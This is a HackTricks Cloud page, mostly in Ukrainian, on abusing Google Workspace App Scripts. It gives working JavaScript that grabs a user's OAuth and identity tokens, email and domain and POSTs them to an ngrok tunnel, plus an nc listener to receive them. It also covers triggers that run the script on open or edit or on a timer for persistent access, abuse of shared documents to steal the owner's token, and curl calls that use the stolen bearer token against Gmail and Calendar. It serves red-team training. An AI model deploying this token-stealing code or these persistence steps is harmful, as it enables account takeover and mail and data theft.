# GWS - App Scripts

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## App Scripts

App Scripts - —Ü–µ **–∫–æ–¥, —è–∫–∏–π –±—É–¥–µ –∞–∫—Ç–∏–≤–æ–≤–∞–Ω–æ, –∫–æ–ª–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –∑ –ø—Ä–∞–≤–∞–º–∏ —Ä–µ–¥–∞–∫—Ç–æ—Ä–∞ –æ—Ç—Ä–∏–º—É—î –¥–æ—Å—Ç—É–ø –¥–æ –¥–æ–∫—É–º–µ–Ω—Ç–∞, –∑ —è–∫–∏–º –ø–æ–≤'—è–∑–∞–Ω–∏–π App Script** —ñ –ø—ñ—Å–ª—è **–ø—Ä–∏–π–Ω—è—Ç—Ç—è –∑–∞–ø–∏—Ç—É OAuth**.\
–í–æ–Ω–∏ —Ç–∞–∫–æ–∂ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω—ñ –Ω–∞ **–≤–∏–∫–æ–Ω–∞–Ω–Ω—è —á–µ—Ä–µ–∑ –ø–µ–≤–Ω–∏–π –ø—Ä–æ–º—ñ–∂–æ–∫ —á–∞—Å—É** –≤–ª–∞—Å–Ω–∏–∫–æ–º App Script (–ø–æ—Å—Ç—ñ–π–Ω—ñ—Å—Ç—å).

### Create App Script

–Ü—Å–Ω—É—î –∫—ñ–ª—å–∫–∞ —Å–ø–æ—Å–æ–±—ñ–≤ —Å—Ç–≤–æ—Ä–∏—Ç–∏ App Script, —Ö–æ—á–∞ –Ω–∞–π–ø–æ—à–∏—Ä–µ–Ω—ñ—à—ñ –∑ –Ω–∏—Ö - —Ü–µ **–∑ Google –î–æ–∫—É–º–µ–Ω—Ç—É (–±—É–¥—å-—è–∫–æ–≥–æ —Ç–∏–ø—É)** —Ç–∞ —è–∫ **–æ–∫—Ä–µ–º–∏–π –ø—Ä–æ–µ–∫—Ç**:

<details>

<summary>Create a container-bound project from Google Docs, Sheets, or Slides</summary>

1. –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–æ–∫—É–º–µ–Ω—Ç Docs, —Ç–∞–±–ª–∏—Ü—é Sheets –∞–±–æ –ø—Ä–µ–∑–µ–Ω—Ç–∞—Ü—ñ—é Slides.
2. –ù–∞—Ç–∏—Å–Ω—ñ—Ç—å **–†–æ–∑—à–∏—Ä–µ–Ω–Ω—è** > **Google Apps Script**.
3. –£ —Ä–µ–¥–∞–∫—Ç–æ—Ä—ñ —Å–∫—Ä–∏–ø—Ç—ñ–≤ –Ω–∞—Ç–∏—Å–Ω—ñ—Ç—å **–ë–µ–∑ –Ω–∞–∑–≤–∏ –ø—Ä–æ–µ–∫—Ç**.
4. –î–∞–π—Ç–µ –≤–∞—à–æ–º—É –ø—Ä–æ–µ–∫—Ç—É –Ω–∞–∑–≤—É —Ç–∞ –Ω–∞—Ç–∏—Å–Ω—ñ—Ç—å **–ü–µ—Ä–µ–π–º–µ–Ω—É–≤–∞—Ç–∏**.

</details>

<details>

<summary>Create a standalone project</summary>

–©–æ–± —Å—Ç–≤–æ—Ä–∏—Ç–∏ –æ–∫—Ä–µ–º–∏–π –ø—Ä–æ–µ–∫—Ç –∑ Apps Script:

1. –ü–µ—Ä–µ–π–¥—ñ—Ç—å –Ω–∞ [`script.google.com`](https://script.google.com/).
2. –ù–∞—Ç–∏—Å–Ω—ñ—Ç—å **–ù–æ–≤–∏–π –ø—Ä–æ–µ–∫—Ç**.
3. –£ —Ä–µ–¥–∞–∫—Ç–æ—Ä—ñ —Å–∫—Ä–∏–ø—Ç—ñ–≤ –Ω–∞—Ç–∏—Å–Ω—ñ—Ç—å **–ë–µ–∑ –Ω–∞–∑–≤–∏ –ø—Ä–æ–µ–∫—Ç**.
4. –î–∞–π—Ç–µ –≤–∞—à–æ–º—É –ø—Ä–æ–µ–∫—Ç—É –Ω–∞–∑–≤—É —Ç–∞ –Ω–∞—Ç–∏—Å–Ω—ñ—Ç—å **–ü–µ—Ä–µ–π–º–µ–Ω—É–≤–∞—Ç–∏**.

</details>

<details>

<summary>Create a standalone project from Google Drive</summary>

1. –í—ñ–¥–∫—Ä–∏–π—Ç–µ [Google Drive](https://drive.google.com/).
2. –ù–∞—Ç–∏—Å–Ω—ñ—Ç—å **–ù–æ–≤–∏–π** > **–Ü–Ω—à–µ** > **Google Apps Script**.

</details>

<details>

<summary>Create a container-bound project from Google Forms</summary>

1. –í—ñ–¥–∫—Ä–∏–π—Ç–µ —Ñ–æ—Ä–º—É –≤ Google Forms.
2. –ù–∞—Ç–∏—Å–Ω—ñ—Ç—å –Ü–Ω—à–µ more\_vert > **–†–µ–¥–∞–∫—Ç–æ—Ä —Å–∫—Ä–∏–ø—Ç—ñ–≤**.
3. –£ —Ä–µ–¥–∞–∫—Ç–æ—Ä—ñ —Å–∫—Ä–∏–ø—Ç—ñ–≤ –Ω–∞—Ç–∏—Å–Ω—ñ—Ç—å **–ë–µ–∑ –Ω–∞–∑–≤–∏ –ø—Ä–æ–µ–∫—Ç**.
4. –î–∞–π—Ç–µ –≤–∞—à–æ–º—É –ø—Ä–æ–µ–∫—Ç—É –Ω–∞–∑–≤—É —Ç–∞ –Ω–∞—Ç–∏—Å–Ω—ñ—Ç—å **–ü–µ—Ä–µ–π–º–µ–Ω—É–≤–∞—Ç–∏**.

</details>

<details>

<summary>Create a standalone project using the clasp command line tool</summary>

`clasp` - —Ü–µ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –∫–æ–º–∞–Ω–¥–Ω–æ–≥–æ —Ä—è–¥–∫–∞, —è–∫–∏–π –¥–æ–∑–≤–æ–ª—è—î –≤–∞–º —Å—Ç–≤–æ—Ä—é–≤–∞—Ç–∏, –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏/–≤–∏–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏ —Ç–∞ —Ä–æ–∑–≥–æ—Ä—Ç–∞—Ç–∏ –ø—Ä–æ–µ–∫—Ç–∏ Apps Script –∑ —Ç–µ—Ä–º—ñ–Ω–∞–ª—É.

–î–∏–≤—ñ—Ç—å—Å—è [–ü–æ—Å—ñ–±–Ω–∏–∫ –ø–æ —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å—É –∫–æ–º–∞–Ω–¥–Ω–æ–≥–æ —Ä—è–¥–∫–∞ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `clasp`](https://developers.google.com/apps-script/guides/clasp) –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó.

</details>

## App Script Scenario <a href="#create-using-clasp" id="create-using-clasp"></a>

### Create Google Sheet with App Script

–ü–æ—á–Ω—ñ—Ç—å –∑—ñ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è App Script, –º–æ—è —Ä–µ–∫–æ–º–µ–Ω–¥–∞—Ü—ñ—è –¥–ª—è —Ü—å–æ–≥–æ —Å—Ü–µ–Ω–∞—Ä—ñ—é - —Å—Ç–≤–æ—Ä–∏—Ç–∏ Google Sheet —ñ –ø–µ—Ä–µ–π—Ç–∏ –¥–æ **`–†–æ–∑—à–∏—Ä–µ–Ω–Ω—è > App Scripts`**, —Ü–µ –≤—ñ–¥–∫—Ä–∏—î **–Ω–æ–≤–∏–π App Script, –ø–æ–≤'—è–∑–∞–Ω–∏–π –∑ —Ç–∞–±–ª–∏—Ü–µ—é**.

### Leak token

–©–æ–± –Ω–∞–¥–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ —Ç–æ–∫–µ–Ω–∞ OAuth, –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –Ω–∞—Ç–∏—Å–Ω—É—Ç–∏ –Ω–∞ **`–°–ª—É–∂–±–∏ +` —ñ –¥–æ–¥–∞—Ç–∏ –æ–±–ª–∞—Å—Ç—ñ, —Ç–∞–∫—ñ —è–∫**:

* **AdminDirectory**: –î–æ—Å—Ç—É–ø –¥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —Ç–∞ –≥—Ä—É–ø –∫–∞—Ç–∞–ª–æ–≥—É (—è–∫—â–æ —É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –¥–æ—Å—Ç–∞—Ç–Ω—å–æ –ø—Ä–∞–≤)
* **Gmail**: –î–ª—è –¥–æ—Å—Ç—É–ø—É –¥–æ –¥–∞–Ω–∏—Ö gmail
* **Drive**: –î–ª—è –¥–æ—Å—Ç—É–ø—É –¥–æ –¥–∞–Ω–∏—Ö –¥–∏—Å–∫–∞
* **Google Sheets API**: –©–æ–± —Ü–µ –ø—Ä–∞—Ü—é–≤–∞–ª–æ –∑ —Ç—Ä–∏–≥–µ—Ä–æ–º

–©–æ–± –∑–º—ñ–Ω–∏—Ç–∏ **–Ω–µ–æ–±—Ö—ñ–¥–Ω—ñ –æ–±–ª–∞—Å—Ç—ñ**, –≤–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–π—Ç–∏ –¥–æ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω—å –ø—Ä–æ–µ–∫—Ç—É —Ç–∞ —É–≤—ñ–º–∫–Ω—É—Ç–∏: **`–ü–æ–∫–∞–∑–∞—Ç–∏ —Ñ–∞–π–ª –º–∞–Ω—ñ—Ñ–µ—Å—Ç—É "appsscript.json" –≤ —Ä–µ–¥–∞–∫—Ç–æ—Ä—ñ`.**

{% code overflow="wrap" %}
```javascript
function getToken() {
var userEmail = Session.getActiveUser().getEmail();
var domain = userEmail.substring(userEmail.lastIndexOf("@") + 1);
var oauthToken = ScriptApp.getOAuthToken();
var identityToken = ScriptApp.getIdentityToken();

// Data json
data = {
"oauthToken": oauthToken,
"identityToken": identityToken,
"email": userEmail,
"domain": domain
}

// Send data
makePostRequest(data);

// Use the APIs, if you don't even if the have configured them in appscript.json the App script won't ask for permissions

// To ask for AdminDirectory permissions
var pageToken = "";
page = AdminDirectory.Users.list({
domain: domain,  // Use the extracted domain
orderBy: 'givenName',
maxResults: 100,
pageToken: pageToken
});

// To ask for gmail permissions
var threads = GmailApp.getInboxThreads(0, 10);

// To ask for drive permissions
var files = DriveApp.getFiles();
}


function makePostRequest(data) {
var url = 'http://5.tcp.eu.ngrok.io:12027';

var options = {
'method' : 'post',
'contentType': 'application/json',
'payload' : JSON.stringify(data)
};

try {
UrlFetchApp.fetch(url, options);
} catch (e) {
Logger.log("Error making POST request: " + e.toString());
}
}
```
{% endcode %}

–©–æ–± –∑–∞—Ö–æ–ø–∏—Ç–∏ –∑–∞–ø–∏—Ç, –≤–∏ –º–æ–∂–µ—Ç–µ –ø—Ä–æ—Å—Ç–æ –≤–∏–∫–æ–Ω–∞—Ç–∏:
```bash
ngrok tcp 4444
nc -lv 4444 #macOS
```
–ó–∞–ø–∏—Ç–∏ –Ω–∞ –¥–æ–∑–≤–æ–ª–∏ –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è App Script:

<figure><img src="../../../.gitbook/assets/image (334).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
–û—Å–∫—ñ–ª—å–∫–∏ –∑–¥—ñ–π—Å–Ω—é—î—Ç—å—Å—è –∑–æ–≤–Ω—ñ—à–Ω—ñ–π –∑–∞–ø–∏—Ç, –∑–∞–ø–∏—Ç OAuth —Ç–∞–∫–æ–∂ **–ø–æ–ø—Ä–æ—Å–∏—Ç—å –¥–æ–∑–≤—ñ–ª –Ω–∞ –¥–æ—Å—Ç—É–ø –¥–æ –∑–æ–≤–Ω—ñ—à–Ω—ñ—Ö –∫—ñ–Ω—Ü–µ–≤–∏—Ö —Ç–æ—á–æ–∫**.
{% endhint %}

### –°—Ç–≤–æ—Ä–∏—Ç–∏ —Ç—Ä–∏–≥–µ—Ä

–ü—ñ—Å–ª—è —Ç–æ–≥–æ, —è–∫ App –±—É–¥–µ –ø—Ä–æ—á–∏—Ç–∞–Ω–æ, –Ω–∞—Ç–∏—Å–Ω—ñ—Ç—å –Ω–∞ **‚è∞ –¢—Ä–∏–≥–µ—Ä–∏**, —â–æ–± —Å—Ç–≤–æ—Ä–∏—Ç–∏ —Ç—Ä–∏–≥–µ—Ä. –Ø–∫ **—Ñ—É–Ω–∫—Ü—ñ—é** –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –≤–∏–±–µ—Ä—ñ—Ç—å **`getToken`**, –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è –ø—Ä–∏ —Ä–æ–∑–≥–æ—Ä—Ç–∞–Ω–Ω—ñ **`Head`**, —É –¥–∂–µ—Ä–µ–ª—ñ –ø–æ–¥—ñ—ó –≤–∏–±–µ—Ä—ñ—Ç—å **`–ó —Ç–∞–±–ª–∏—Ü—ñ`** —Ç–∞ —Ç–∏–ø –ø–æ–¥—ñ—ó –≤–∏–±–µ—Ä—ñ—Ç—å **`–ü—Ä–∏ –≤—ñ–¥–∫—Ä–∏—Ç—Ç—ñ`** –∞–±–æ **`–ü—Ä–∏ —Ä–µ–¥–∞–≥—É–≤–∞–Ω–Ω—ñ`** (–∑–≥—ñ–¥–Ω–æ –∑ –≤–∞—à–∏–º–∏ –ø–æ—Ç—Ä–µ–±–∞–º–∏) —ñ –∑–±–µ—Ä–µ–∂—ñ—Ç—å.

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ **–≤–∏–∫–æ–Ω–∞–Ω–Ω—è App Scripts –Ω–∞ –≤–∫–ª–∞–¥—Ü—ñ –í–∏–∫–æ–Ω–∞–Ω–Ω—è**, —è–∫—â–æ —Ö–æ—á–µ—Ç–µ —â–æ—Å—å –Ω–∞–ª–∞–≥–æ–¥–∏—Ç–∏.

### –°–ø—ñ–ª—å–Ω–∏–π –¥–æ—Å—Ç—É–ø

–©–æ–± **–∑–∞–ø—É—Å—Ç–∏—Ç–∏** **App Script**, –∂–µ—Ä—Ç–≤–∞ –ø–æ–≤–∏–Ω–Ω–∞ –ø—ñ–¥–∫–ª—é—á–∏—Ç–∏—Å—è –∑ **–¥–æ—Å—Ç—É–ø–æ–º —Ä–µ–¥–∞–∫—Ç–æ—Ä–∞**.

{% hint style="success" %}
**–¢–æ–∫–µ–Ω**, –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è **App Script**, –±—É–¥–µ —Ç–æ–∫–µ–Ω–æ–º **—Ç–≤–æ—Ä—Ü—è —Ç—Ä–∏–≥–µ—Ä–∞**, –Ω–∞–≤—ñ—Ç—å —è–∫—â–æ —Ñ–∞–π–ª –≤—ñ–¥–∫—Ä–∏—Ç–æ —è–∫ —Ä–µ–¥–∞–∫—Ç–æ—Ä —ñ–Ω—à–∏–º–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º–∏.
{% endhint %}

### –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è –¥–æ–∫—É–º–µ–Ω—Ç–∞–º–∏, —Å–ø—ñ–ª—å–Ω–æ –Ω–∞–¥—ñ—Å–ª–∞–Ω–∏–º–∏ –º–µ–Ω—ñ

{% hint style="danger" %}
–Ø–∫—â–æ —Ö—Ç–æ—Å—å **–ø–æ–¥—ñ–ª–∏–≤—Å—è –∑ –≤–∞–º–∏ –¥–æ–∫—É–º–µ–Ω—Ç–æ–º –∑ App Scripts —ñ —Ç—Ä–∏–≥–µ—Ä–æ–º, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ Head** App Script (–Ω–µ —Ñ—ñ–∫—Å–æ–≤–∞–Ω–µ —Ä–æ–∑–≥–æ—Ä—Ç–∞–Ω–Ω—è), –≤–∏ –º–æ–∂–µ—Ç–µ –∑–º—ñ–Ω–∏—Ç–∏ –∫–æ–¥ App Script (–¥–æ–¥–∞–≤—à–∏, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, —Ñ—É–Ω–∫—Ü—ñ—ó –¥–ª—è –∫—Ä–∞–¥—ñ–∂–∫–∏ —Ç–æ–∫–µ–Ω—ñ–≤), –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ –Ω—å–æ–≥–æ –¥–æ—Å—Ç—É–ø, —ñ **App Script –±—É–¥–µ –≤–∏–∫–æ–Ω–∞–Ω–æ –∑ –¥–æ–∑–≤–æ–ª–∞–º–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, —è–∫–∏–π –ø–æ–¥—ñ–ª–∏–≤—Å—è –∑ –≤–∞–º–∏ –¥–æ–∫—É–º–µ–Ω—Ç–æ–º**! (–∑–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ —Ç–æ–∫–µ–Ω OAuth –≤–ª–∞—Å–Ω–∏–∫–∞ –º–∞—Ç–∏–º–µ —Ç–∞–∫—ñ –æ–±–ª–∞—Å—Ç—ñ –¥–æ—Å—Ç—É–ø—É, —è–∫—ñ –±—É–ª–∏ –Ω–∞–¥–∞–Ω—ñ –ø—ñ–¥ —á–∞—Å —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è —Ç—Ä–∏–≥–µ—Ä–∞).

**–°–ø–æ–≤—ñ—â–µ–Ω–Ω—è –±—É–¥–µ –Ω–∞–¥—ñ—Å–ª–∞–Ω–æ —Ç–≤–æ—Ä—Ü–µ–≤—ñ —Å–∫—Ä–∏–ø—Ç–∞, –≤–∫–∞–∑—É—é—á–∏, —â–æ —Ö—Ç–æ—Å—å –∑–º—ñ–Ω–∏–≤ —Å–∫—Ä–∏–ø—Ç** (—è–∫ —â–æ–¥–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –¥–æ–∑–≤–æ–ª—ñ–≤ gmail –¥–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è —Ñ—ñ–ª—å—Ç—Ä–∞, —â–æ–± –∑–∞–ø–æ–±—ñ–≥—Ç–∏ —Å–ø–æ–≤—ñ—â–µ–Ω–Ω—é?)
{% endhint %}

{% hint style="success" %}
–Ø–∫—â–æ **–∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑–º—ñ–Ω—é—î –æ–±–ª–∞—Å—Ç—ñ –¥–æ—Å—Ç—É–ø—É App Script**, –æ–Ω–æ–≤–ª–µ–Ω–Ω—è **–Ω–µ –±—É–¥—É—Ç—å –∑–∞—Å—Ç–æ—Å–æ–≤–∞–Ω—ñ** –¥–æ –¥–æ–∫—É–º–µ–Ω—Ç–∞, –ø–æ–∫–∏ –Ω–µ –±—É–¥–µ —Å—Ç–≤–æ—Ä–µ–Ω–æ **–Ω–æ–≤–∏–π —Ç—Ä–∏–≥–µ—Ä** –∑ –∑–º—ñ–Ω–∞–º–∏. –¢–æ–º—É –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –Ω–µ –∑–º–æ–∂–µ –≤–∫—Ä–∞—Å—Ç–∏ —Ç–æ–∫–µ–Ω –≤–ª–∞—Å–Ω–∏–∫–∞ —Ç–≤–æ—Ä—Ü—è –∑ –±—ñ–ª—å—à–∏–º–∏ –æ–±–ª–∞—Å—Ç—è–º–∏ –¥–æ—Å—Ç—É–ø—É, –Ω—ñ–∂ —Ç—ñ, —è–∫—ñ –≤—ñ–Ω –≤—Å—Ç–∞–Ω–æ–≤–∏–≤ —É —Ç—Ä–∏–≥–µ—Ä—ñ, —è–∫–∏–π –≤—ñ–Ω —Å—Ç–≤–æ—Ä–∏–≤.
{% endhint %}

### –ö–æ–ø—ñ—é–≤–∞–Ω–Ω—è –∑–∞–º—ñ—Å—Ç—å —Å–ø—ñ–ª—å–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø—É

–ö–æ–ª–∏ –≤–∏ —Å—Ç–≤–æ—Ä—é—î—Ç–µ –ø–æ—Å–∏–ª–∞–Ω–Ω—è –¥–ª—è —Å–ø—ñ–ª—å–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø—É –¥–æ –¥–æ–∫—É–º–µ–Ω—Ç–∞, —Å—Ç–≤–æ—Ä—é—î—Ç—å—Å—è –ø–æ—Å–∏–ª–∞–Ω–Ω—è, –ø–æ–¥—ñ–±–Ω–µ –¥–æ —Ü—å–æ–≥–æ: `https://docs.google.com/spreadsheets/d/1i5[...]aIUD/edit`\
–Ø–∫—â–æ –≤–∏ **–∑–º—ñ–Ω–∏—Ç–µ** –∑–∞–∫—ñ–Ω—á–µ–Ω–Ω—è **"/edit"** –Ω–∞ **"/copy"**, –∑–∞–º—ñ—Å—Ç—å –¥–æ—Å—Ç—É–ø—É –¥–æ –Ω—å–æ–≥–æ Google –∑–∞–ø–∏—Ç–∞—î –≤–∞—Å, —á–∏ —Ö–æ—á–µ—Ç–µ –≤–∏ **—Å—Ç–≤–æ—Ä–∏—Ç–∏ –∫–æ–ø—ñ—é –¥–æ–∫—É–º–µ–Ω—Ç–∞:**

<figure><img src="../../../.gitbook/assets/image (335).png" alt=""><figcaption></figcaption></figure>

–Ø–∫—â–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –∫–æ–ø—ñ—é—î –π–æ–≥–æ —Ç–∞ –æ—Ç—Ä–∏–º—É—î –¥–æ—Å—Ç—É–ø, —è–∫ **–≤–º—ñ—Å—Ç –¥–æ–∫—É–º–µ–Ω—Ç–∞, —Ç–∞–∫ —ñ App Scripts –±—É–¥—É—Ç—å —Å–∫–æ–ø—ñ–π–æ–≤–∞–Ω—ñ**, –æ–¥–Ω–∞–∫ **—Ç—Ä–∏–≥–µ—Ä–∏ –Ω–µ –±—É–¥—É—Ç—å**, —Ç–æ–º—É **–Ω—ñ—á–æ–≥–æ –Ω–µ –±—É–¥–µ –≤–∏–∫–æ–Ω–∞–Ω–æ**.

### –°–ø—ñ–ª—å–Ω–∏–π –¥–æ—Å—Ç—É–ø —è–∫ –≤–µ–±-–¥–æ–¥–∞—Ç–æ–∫

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ —Ç–∞–∫–æ–∂ –º–æ–∂–ª–∏–≤–æ **–ø–æ–¥—ñ–ª–∏—Ç–∏—Å—è App Script —è–∫ –≤–µ–±-–¥–æ–¥–∞—Ç–∫–æ–º** (–≤ —Ä–µ–¥–∞–∫—Ç–æ—Ä—ñ App Script, —Ä–æ–∑–≥–æ—Ä–Ω—ñ—Ç—å —è–∫ –≤–µ–±-–¥–æ–¥–∞—Ç–æ–∫), –∞–ª–µ –∑'—è–≤–∏—Ç—å—Å—è —Å–ø–æ–≤—ñ—â–µ–Ω–Ω—è, –ø–æ–¥—ñ–±–Ω–µ –¥–æ —Ü—å–æ–≥–æ:

<figure><img src="../../../.gitbook/assets/image (337).png" alt=""><figcaption></figcaption></figure>

–ü—ñ—Å–ª—è —Ü—å–æ–≥–æ –∑'—è–≤–∏—Ç—å—Å—è **—Ç–∏–ø–æ–≤–µ —Å–ø–æ–≤—ñ—â–µ–Ω–Ω—è OAuth, —â–æ –∑–∞–ø–∏—Ç—É—î** –Ω–µ–æ–±—Ö—ñ–¥–Ω—ñ –¥–æ–∑–≤–æ–ª–∏.

### –¢–µ—Å—Ç—É–≤–∞–Ω–Ω—è

–í–∏ –º–æ–∂–µ—Ç–µ –ø—Ä–æ—Ç–µ—Å—Ç—É–≤–∞—Ç–∏ –∑—ñ–±—Ä–∞–Ω–∏–π —Ç–æ–∫–µ–Ω –¥–ª—è –ø–µ—Ä–µ–ª—ñ–∫—É –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω–∏—Ö –∞–¥—Ä–µ—Å –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é:

{% code overflow="wrap" %}
```bash
curl -X GET "https://www.googleapis.com/gmail/v1/users/<user@email>/messages" \
-H "Authorization: Bearer <token>"
```
{% endcode %}

–°–ø–∏—Å–æ–∫ –∫–∞–ª–µ–Ω–¥–∞—Ä—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞:
```bash
curl -H "Authorization: Bearer $OAUTH_TOKEN" \
-H "Accept: application/json" \
"https://www.googleapis.com/calendar/v3/users/me/calendarList"
```
## App Script —è–∫ –ø–æ—Å—Ç—ñ–π–Ω–∏–π –¥–æ—Å—Ç—É–ø

–û–¥–∏–Ω –∑ –≤–∞—Ä—ñ–∞–Ω—Ç—ñ–≤ –ø–æ—Å—Ç—ñ–π–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø—É - —Ü–µ **—Å—Ç–≤–æ—Ä–∏—Ç–∏ –¥–æ–∫—É–º–µ–Ω—Ç —ñ –¥–æ–¥–∞—Ç–∏ —Ç—Ä–∏–≥–µ—Ä –¥–ª—è —Ñ—É–Ω–∫—Ü—ñ—ó getToken** —Ç–∞ –ø–æ–¥—ñ–ª–∏—Ç–∏—Å—è –¥–æ–∫—É–º–µ–Ω—Ç–æ–º –∑ –∞—Ç–∞–∫—É—é—á–∏–º, —â–æ–± —â–æ—Ä–∞–∑—É, –∫–æ–ª–∏ –∞—Ç–∞–∫—É—é—á–∏–π –≤—ñ–¥–∫—Ä–∏–≤–∞—î —Ñ–∞–π–ª, –≤—ñ–Ω **–µ–∫—Å—Ç—Ä–∞–≥—É—î —Ç–æ–∫–µ–Ω –∂–µ—Ä—Ç–≤–∏.**

–¢–∞–∫–æ–∂ –º–æ–∂–ª–∏–≤–æ —Å—Ç–≤–æ—Ä–∏—Ç–∏ App Script —ñ –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ –π–æ–≥–æ —Ç—Ä–∏–≥–µ—Ä –Ω–∞ –∫–æ–∂–µ–Ω X —á–∞—Å (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –∫–æ–∂–Ω—É —Ö–≤–∏–ª–∏–Ω—É, –≥–æ–¥–∏–Ω—É, –¥–µ–Ω—å...). –ê—Ç–∞–∫—É—é—á–∏–π, —è–∫–∏–π **–∫–æ–º–ø—Ä–æ–º–µ—Ç—É–≤–∞–≤ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –∞–±–æ —Å–µ—Å—ñ—é –∂–µ—Ä—Ç–≤–∏, –º–æ–∂–µ –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ —Ç—Ä–∏–≥–µ—Ä —á–∞—Å—É App Script —ñ —â–æ–¥–Ω—è** –≤–∏—Ç—ñ–∫–∞—Ç–∏ –¥—É–∂–µ –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏–π OAuth —Ç–æ–∫–µ–Ω:

–ü—Ä–æ—Å—Ç–æ —Å—Ç–≤–æ—Ä—ñ—Ç—å App Script, –ø–µ—Ä–µ–π–¥—ñ—Ç—å –¥–æ –¢—Ä–∏–≥–µ—Ä—ñ–≤, –Ω–∞—Ç–∏—Å–Ω—ñ—Ç—å –î–æ–¥–∞—Ç–∏ —Ç—Ä–∏–≥–µ—Ä —ñ –≤–∏–±–µ—Ä—ñ—Ç—å —è–∫ –¥–∂–µ—Ä–µ–ª–æ –ø–æ–¥—ñ—ó –ß–∞—Å–æ–≤–∏–π —Ç—Ä–∏–≥–µ—Ä, –∞ —Ç–∞–∫–æ–∂ –≤–∏–±–µ—Ä—ñ—Ç—å –æ–ø—Ü—ñ—ó, —è–∫—ñ –≤–∞–º –Ω–∞–π–±—ñ–ª—å—à–µ –ø—ñ–¥—Ö–æ–¥—è—Ç—å:

<figure><img src="../../../.gitbook/assets/image (336).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
–¶–µ —Å—Ç–≤–æ—Ä–∏—Ç—å –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω–∏–π –ª–∏—Å—Ç –ø—Ä–æ –±–µ–∑–ø–µ–∫—É —Ç–∞ push-–ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –Ω–∞ –≤–∞—à –º–æ–±—ñ–ª—å–Ω–∏–π —Ç–µ–ª–µ—Ñ–æ–Ω, —â–æ —Å–ø–æ–≤—ñ—â–∞—î –ø—Ä–æ —Ü–µ.
{% endhint %}

### –û–±—Ö—ñ–¥ –Ω–µ–ø–µ—Ä–µ–≤—ñ—Ä–µ–Ω–æ–≥–æ –∑–∞–ø–∏—Ç—É —Å–ø—ñ–ª—å–Ω–æ–≥–æ –¥–æ–∫—É–º–µ–Ω—Ç–∞

